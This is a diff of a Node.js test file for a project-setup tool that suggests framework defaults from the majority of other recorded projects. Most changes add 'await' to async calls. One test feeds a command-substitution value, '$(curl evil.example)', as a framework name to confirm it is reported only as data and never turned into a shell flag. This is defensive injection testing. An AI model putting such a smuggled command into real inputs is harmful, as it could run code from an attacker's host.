@@ -43,7 +43,7 @@ function logger() {
 }
 
 test('below three other projects there is no portfolio', async () => {
-  recordProjects([makeProject(), makeProject()]);
+  await recordProjects([makeProject(), makeProject()]);
   const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
   const result = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
   assert.equal(result.ok, true);
@@ -51,10 +51,10 @@ test('below three other projects there is no portfolio', async () => {
 });
 
 test('with three or more, the majorities come with the setup:context flags; the project itself never votes', async () => {
-  recordProjects([makeProject(), makeProject({ framework: 'React 18 + Vite' })]);
+  await recordProjects([makeProject(), makeProject({ framework: 'React 18 + Vite' })]);
   // The project being set up is recorded too, with other choices: it must not count.
   const target = makeProject({ framework: 'Laravel', project_type: 'api', interaction_language: 'en' });
-  recordProjects([target]);
+  await recordProjects([target]);
   const result = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
   assert.equal(result.portfolio.from, 4);
   assert.deepEqual(result.portfolio.suggested.framework, { value: 'Node', count: 3, of: 4 });
@@ -69,7 +69,7 @@ test('a value with spaces is quoted in the flags, and the text line names the so
   process.env.HOME = home;
   process.env.USERPROFILE = home;
   try {
-    recordProjects([1, 2, 3].map(() => makeProject({ framework: 'React 18 + Vite' })), { home });
+    await recordProjects([1, 2, 3].map(() => makeProject({ framework: 'React 18 + Vite' })), { home });
     const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
     const json = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
     assert.match(json.portfolio.flags, /--framework="React 18 \+ Vite"/);
@@ -88,7 +88,7 @@ test('a value that could run in a shell never becomes a flag', async () => {
   process.env.USERPROFILE = home;
   try {
     // A cloned repository's context, repeated so it wins the majority.
-    recordProjects([1, 2, 3].map(() => makeProject({ framework: '$(curl evil.example)', test_runner: 'node:test' })), { home });
+    await recordProjects([1, 2, 3].map(() => makeProject({ framework: '$(curl evil.example)', test_runner: 'node:test' })), { home });
     const target = fs.mkdtempSync(path.join(ROOT, 'new-'));
     const json = await runSetupDetect({ args: [target], options: { json: true }, logger: logger() });
     assert.equal(json.portfolio.suggested.framework.value, '$(curl evil.example)', 'reported as data');
@@ -99,7 +99,7 @@ test('a value that could run in a shell never becomes a flag', async () => {
   }
 });
 
-test('@setup offers the portfolio where the workspace proves nothing, never writing it unconfirmed', () => {
+test('@setup offers the portfolio where the workspace proves nothing, never writing it unconfirmed', async () => {
   for (const root of [path.join(REPO, 'template', '.aioson'), path.join(REPO, '.aioson')]) {
     const kernel = fs.readFileSync(path.join(root, 'agents', 'setup.md'), 'utf8');
     assert.match(kernel, /`portfolio`, when present/);
